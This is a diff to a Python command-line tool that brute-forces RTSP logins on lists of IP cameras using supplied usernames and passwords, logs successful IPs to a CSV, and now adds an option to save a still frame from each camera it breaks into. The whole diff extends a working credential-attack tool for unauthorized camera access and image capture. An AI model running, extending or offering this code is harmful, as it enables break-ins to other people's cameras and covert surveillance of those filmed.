@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 
 import cv2
+from pathlib import Path
 from datetime import date
 from urllib.parse import quote
 from multiprocessing import Lock, Pool, cpu_count
@@ -29,6 +30,7 @@ lock = Lock()
 
 threads_number = cpu_count()
 verbose = True
+capture_frame = False
 
 def loginRTSP(ip, user, password):
     user = quote(user)
@@ -39,6 +41,9 @@ def loginRTSP(ip, user, password):
         else:
             video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
         if video_capture.isOpened():
+            ret, frame = video_capture.read()
+            if ret:
+                cv2.imwrite(f"frames/{ip}.jpg", frame)
             return True
         else:
             return False
@@ -62,6 +67,7 @@ if __name__ == "__main__":
                               ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                               ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
+                              ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                               ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
     if not arguments.ip:
         display('-', "Please Provide a List of IP Addresses")
@@ -120,6 +126,11 @@ if __name__ == "__main__":
         arguments.verbose = True
     else:
         arguments.verbose = False
+    if arguments.capture == "True":
+        cwd = Path.cwd()
+        frames_folder = cwd / "frames"
+        frames_folder.mkdir(exist_ok=True)
+        capture_frame = True
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     details = []
